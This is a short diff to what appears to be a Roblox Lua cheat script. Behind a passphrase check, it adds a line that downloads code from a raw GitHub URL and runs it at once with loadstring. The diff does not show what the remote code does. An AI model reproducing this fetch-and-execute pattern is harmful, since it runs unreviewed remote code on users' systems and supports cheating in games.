@@ -52,6 +52,7 @@ Tab:AddTextbox({
 if Value == "IMLOSINGMYMIND" then
  print("Script: Access granted!")
  warn("Script: Things may be buggy and not work!")
+ loadstring(game:HttpGet("https://raw.githubusercontent.com/THEVOICESTOLDMEOTOO/BroChillax/refs/heads/main/OverWrite"))()
  OrionLib:Destroy()
 end
 
